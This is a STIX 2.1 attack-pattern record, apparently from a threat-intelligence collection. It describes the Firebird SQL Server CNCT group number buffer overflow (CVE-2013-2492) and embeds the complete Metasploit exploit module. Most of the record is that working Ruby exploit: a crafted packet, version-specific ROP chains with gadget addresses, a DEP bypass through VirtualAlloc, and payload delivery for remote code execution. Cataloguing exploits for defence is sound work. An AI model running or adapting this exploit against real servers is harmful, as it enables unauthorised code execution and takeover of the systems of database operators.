{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7e07574-7097-4a3a-803a-cf0cccff8272",
    "created": "2024-08-14T16:46:05.200083Z",
    "modified": "2024-08-14T16:46:05.200087Z",
    "name": "Firebird Relational Database CNCT Group Number Buffer Overflow",
    "description": " This module exploits a vulnerability in Firebird SQL Server.  A specially crafted packet can be sent which will overwrite a pointer allowing the attacker to control where data is read from.  Shortly, following the controlled read, the pointer is called resulting in code execution.  The vulnerability exists with a group number extracted from the CNCT information which is sent by the client, and whose size is not properly checked.  This module uses an existing call to memcpy, just prior to the vulnerable code which allows a small amount of data to be written to the stack. A two-phases stack pivot allows to execute the ROP chain which ultimately is used to execute VirtualAlloc and bypass DEP. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/fb_cnct_group.rb",
            "external_id": "fb_cnct_group.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2492"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize\n    super(\n      'Name'           => 'Firebird Relational Database CNCT Group Number Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in Firebird SQL Server.  A specially\n        crafted packet can be sent which will overwrite a pointer allowing the attacker to\n        control where data is read from.  Shortly, following the controlled read, the\n        pointer is called resulting in code execution.\n\n        The vulnerability exists with a group number extracted from the CNCT information,\n        which is sent by the client, and whose size is not properly checked.\n\n        This module uses an existing call to memcpy, just prior to the vulnerable code,\n        which allows a small amount of data to be written to the stack. A two-phases\n        stack pivot allows to execute the ROP chain which ultimately is used to execute\n        VirtualAlloc and bypass DEP.\n      },\n      'Author'      => 'Spencer McIntyre',\n      'Arch'        => ARCH_X86,\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'CVE', '2013-2492' ],\n          [ 'OSVDB', '91044' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh'\n        },\n      'Payload'      =>\n        {\n          # Stackpivot => mov eax,fs:[0x18] # add eax,8 # mov esp,[eax]\n          'Prepend'  => \"\\x64\\xa1\\x18\\x00\\x00\\x00\\x83\\xc0\\x08\\x8b\\x20\",\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x0a\\x0d\"\n        },\n      'Targets'     =>\n        [\n          # pivots are pointers to stack pivots of size 0x28\n          [ 'Windows FB 2.5.2.26539', { 'pivot' => 0x005ae1fc, 'rop_nop' => 0x005b0384, 'rop_pop' => 0x4a831344 } ],\n          [ 'Windows FB 2.5.1.26351', { 'pivot' => 0x4add2302, 'rop_nop' => 0x00424a50, 'rop_pop' => 0x00656472 } ],\n          [ 'Windows FB 2.1.5.18496', { 'pivot' => 0x4ad5df4d, 'rop_nop' => 0x0042ba8c, 'rop_pop' => 0x005763d5 } ],\n          [ 'Windows FB 2.1.4.18393', { 'pivot' => 0x4adf4ed5, 'rop_nop' => 0x00423b82, 'rop_pop' => 0x4a843429 } ],\n          [ 'Debug', { 'pivot' => 0xdead1337, 'rop_nop' => 0xdead1337, 'rop_pop' => 0xdead1337 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => 'Jan 31 2013',\n      'Notes'          =>\n        {\n          'Stability' => [ CRASH_SERVICE_RESTARTS ],\n        },\n    )\n\n    register_options([Opt::RPORT(3050)])\n  end\n\n  def check\n    begin\n      connect\n    rescue\n      vprint_error(\"Unable to get a connection\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    filename =  \"C:\\\\#{rand_text_alpha(12)}.fdb\"\n    username = rand_text_alpha(7)\n\n    check_data =  \"\"\n    check_data << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x24\"\n    check_data << \"\\x00\\x00\\x00\\x13\"\n    check_data << filename\n    check_data << \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x24\"\n    check_data << \"\\x01\\x07\" << username << \"\\x04\\x15\\x6c\\x6f\\x63\\x61\\x6c\"\n    check_data << \"\\x68\\x6f\\x73\\x74\\x2e\\x6c\\x6f\\x63\\x61\\x6c\\x64\\x6f\\x6d\\x61\\x69\\x6e\"\n    check_data << \"\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\"\n    check_data << \"\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x01\"\n    check_data << \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x04\\xff\\xff\\x80\\x0b\"\n    check_data << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x06\"\n    check_data << \"\\xff\\xff\\x80\\x0c\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x05\"\n    check_data << \"\\x00\\x00\\x00\\x08\"\n\n    sock.put(check_data)\n    data = sock.recv(16)\n    disconnect\n\n    opcode = data.unpack(\"N*\")[0]\n    if opcode == 3 # Accept\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def stack_pivot_rop_chain\n    case target.name\n    when 'Windows FB 2.5.2.26539'\n      rop_chain = [\n        0x005e1ea4,\t\t# MOV EAX,EDI # RETN [fbserver.exe]\n        0x0059ffeb,\t\t# POP EBP # RETN [fbserver.exe]\n        0x0000153c,\t\t# 0x0000153c-> ebp\n        0x005d261f,\t\t# ADD EBP,EAX # MOV EBX,59FFFFC9 # RETN [fbserver.exe]\n        0x0059fe1f,\t\t# MOV ESP,EBP # POP EBP # RETN [fbserver.exe]\n      ].pack(\"V*\")\n    when 'Windows FB 2.5.1.26351'\n      rop_chain = [\n        0x005e1ab8,\t\t# MOV EAX,EDI # RETN [fbserver.exe]\n        0x0059650b,\t\t# POP EBP # RETN [fbserver.exe]\n        0x0000153c,\t\t# 0x0000153c-> ebp\n        0x005cf6ff,\t\t# ADD EBP,EAX # MOV EBX,59FFFFC9 # RETN [fbserver.exe]\n        0x0059a3db,\t\t# MOV ESP,EBP # POP EBP # RETN [fbserver.exe]\n      ].pack(\"V*\")\n    when 'Windows FB 2.1.5.18496'\n      rop_chain = [\n        0x0055b844,\t\t# MOV EAX,EDI # RETN [fbserver.exe]\n        0x4a86ee77,\t\t# POP ECX # RETN [icuuc30.dll]\n        0x000001c0,\t\t# 0x000001c0-> ecx\n        0x005aee63,\t\t# ADD EAX,ECX # RETN [fbserver.exe]\n        0x4a82d326,\t\t# XCHG EAX,ESP # RETN [icuuc30.dll]\n      ].pack(\"V*\")\n    when 'Windows FB 2.1.4.18393'\n      rop_chain = [\n        0x0042264c,\t\t# MOV EAX,EDI # RETN [fbserver.exe]\n        0x4a8026e1,\t\t# POP ECX # RETN [icuuc30.dll]\n        0x000001c0,\t\t# 0x000001c0-> ecx\n        0x004c5499,\t\t# ADD EAX,ECX # RETN [fbserver.exe]\n        0x4a847664,\t\t# XCHG EAX,ESP # RETN [icuuc30.dll]\n      ].pack(\"V*\")\n    when 'Debug'\n      rop_chain = [ ].fill(0x41414141, 0..5).pack(\"V*\")\n    end\n    return rop_chain\n  end\n\n  def final_rop_chain\n    # all rop chains in here created with mona.py, thanks corelan!\n    case target.name\n    when 'Windows FB 2.5.2.26539'\n      rop_chain = [\n        0x4a831344,\t# POP ECX # RETN [icuuc30.dll]\n        0x0065f16c,\t# ptr to &VirtualAlloc() [IAT fbserver.exe]\n        0x005989f0,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN [fbserver.exe]\n        0x004666a6,\t# XCHG EAX,ESI # RETN [fbserver.exe]\n        0x00431905,\t# POP EBP # RETN [fbserver.exe]\n        0x00401932,\t# & push esp # ret  [fbserver.exe]\n        0x4a844ac0,\t# POP EBX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> ebx\n        0x4a85bfee,\t# POP EDX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> edx\n        0x005dae9e,\t# POP ECX # RETN [fbserver.exe]\n        0x00000040,\t# 0x00000040-> ecx\n        0x0057a822,\t# POP EDI # RETN [fbserver.exe]\n        0x005b0384,\t# RETN (ROP NOP) [fbserver.exe]\n        0x0046f8c3,\t# POP EAX # RETN [fbserver.exe]\n        0x90909090,\t# nop\n        0x00586002,\t# PUSHAD # RETN [fbserver.exe]\n      ].pack(\"V*\")\n    when 'Windows FB 2.5.1.26351'\n      rop_chain = [\n        0x00656472,\t# POP ECX # RETN [fbserver.exe]\n        0x0065b16c,\t# ptr to &VirtualAlloc() [IAT fbserver.exe]\n        0x00410940,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN [fbserver.exe]\n        0x0063be76,\t# XCHG EAX,ESI # RETN [fbserver.exe]\n        0x0041d1ae,\t# POP EBP # RETN [fbserver.exe]\n        0x0040917f,\t# & call esp [fbserver.exe]\n        0x4a8589c0,\t# POP EBX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> ebx\n        0x4a864cc3,\t# POP EDX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> edx\n        0x0064ef59,\t# POP ECX # RETN [fbserver.exe]\n        0x00000040,\t# 0x00000040-> ecx\n        0x005979fa,\t# POP EDI # RETN [fbserver.exe]\n        0x00424a50,\t# RETN (ROP NOP) [fbserver.exe]\n        0x4a86052d,\t# POP EAX # RETN [icuuc30.dll]\n        0x90909090,\t# nop\n        0x005835f2,\t# PUSHAD # RETN [fbserver.exe]\n      ].pack(\"V*\")\n    when 'Windows FB 2.1.5.18496'\n      rop_chain = [\n        0x005763d5,\t# POP EAX # RETN [fbserver.exe]\n        0x005ce120,\t# ptr to &VirtualAlloc() [IAT fbserver.exe]\n        0x004865a4,\t# MOV EAX,DWORD PTR DS:[EAX] # RETN [fbserver.exe]\n        0x004cf4f6,\t# XCHG EAX,ESI # RETN [fbserver.exe]\n        0x004e695a,\t# POP EBP # RETN [fbserver.exe]\n        0x004d9e6d,\t# & jmp esp [fbserver.exe]\n        0x4a828650,\t# POP EBX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> ebx\n        0x4a85bfee,\t# POP EDX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> edx\n        0x00590328,\t# POP ECX # RETN [fbserver.exe]\n        0x00000040,\t# 0x00000040-> ecx\n        0x4a8573a1,\t# POP EDI # RETN [icuuc30.dll]\n        0x0042ba8c,\t# RETN (ROP NOP) [fbserver.exe]\n        0x00577605,\t# POP EAX # RETN [fbserver.exe]\n        0x90909090,\t# nop\n        0x004530ce,\t# PUSHAD # RETN [fbserver.exe]\n      ].pack(\"V*\")\n    when 'Windows FB 2.1.4.18393'\n      rop_chain = [\n        0x4a843429,\t# POP ECX # RETN [icuuc30.dll]\n        0x005ca120,\t# ptr to &VirtualAlloc() [IAT fbserver.exe]\n        0x0055a870,\t# MOV EAX,DWORD PTR DS:[ECX] # RETN [fbserver.exe]\n        0x004cecf6,\t# XCHG EAX,ESI # RETN [fbserver.exe]\n        0x004279c0,\t# POP EBP # RETN [fbserver.exe]\n        0x0040747d,\t# & call esp [fbserver.exe]\n        0x004ebef1,\t# POP EBX # RETN [fbserver.exe]\n        0x00001000,\t# 0x00001000-> ebx\n        0x4a864c5e,\t# POP EDX # RETN [icuuc30.dll]\n        0x00001000,\t# 0x00001000-> edx\n        0x004eaa3b,\t# POP ECX # RETN [fbserver.exe]\n        0x00000040,\t# 0x00000040-> ecx\n        0x4a8330a2,\t# POP EDI # RETN [icuuc30.dll]\n        0x00423b82,\t# RETN (ROP NOP) [fbserver.exe]\n        0x0046b5b1,\t# POP EAX # RETN [fbserver.exe]\n        0x90909090,\t# nop\n        0x004c8cfc,\t# PUSHAD # RETN [fbserver.exe]\n      ].pack(\"V*\")\n    when 'Debug'\n      rop_chain = [ ].fill(0x41414141, 0..17).pack(\"V*\")\n    end\n    return rop_chain\n  end\n\n  def exploit\n    connect\n\n    rop_nop_sled = [ ].fill(target['rop_nop'], 0..16).pack(\"V*\")\n\n    # this data gets written to the stack via memcpy, no more than 32 bytes can be written\n    overwrite_and_rop_chain =  [ target['rop_pop'] ].pack(\"V\") # POP to skip the 4 bytes of the original pivot\n    overwrite_and_rop_chain << [ (target['pivot'] - 8) ].pack(\"V\") # MOV EDX,DWORD PTR DS:[EAX+8]\n    overwrite_and_rop_chain << stack_pivot_rop_chain\n\n    filename  =  \"C:\\\\#{rand_text_alpha(13)}.fdb\"\n    evil_data =  \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x24\"\n    evil_data << \"\\x00\\x00\\x00\\x14\"\n    evil_data << filename\n    evil_data << \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x24\"\n    evil_data << \"\\x05\\x20\"\n    evil_data << overwrite_and_rop_chain\n    evil_data << \"\\x15\\x6c\\x6f\\x63\\x61\\x6c\"\n    evil_data << \"\\x68\\x6f\\x73\\x74\\x2e\\x6c\\x6f\\x63\\x61\\x6c\\x64\\x6f\\x6d\\x61\\x69\\x6e\"\n    evil_data << \"\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\"\n    evil_data << \"\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x01\"\n    evil_data << \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x04\\xff\\xff\\x80\\x0b\"\n    evil_data << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x06\"\n    evil_data << \"\\x41\\x41\\x41\\x41\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x05\"\n    evil_data << \"\\x00\\x00\\x00\\x08\\x00\\x41\\x41\\x41\"\n    evil_data << rop_nop_sled\n    evil_data << final_rop_chain\n    evil_data << payload.encoded\n\n    print_status(\"#{rhost}:#{rport} - Sending Connection Request For #{filename}\")\n    sock.put(evil_data)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "Jan 31 2013",
    "x_mitre_platforms": [
        "win'"
    ]
}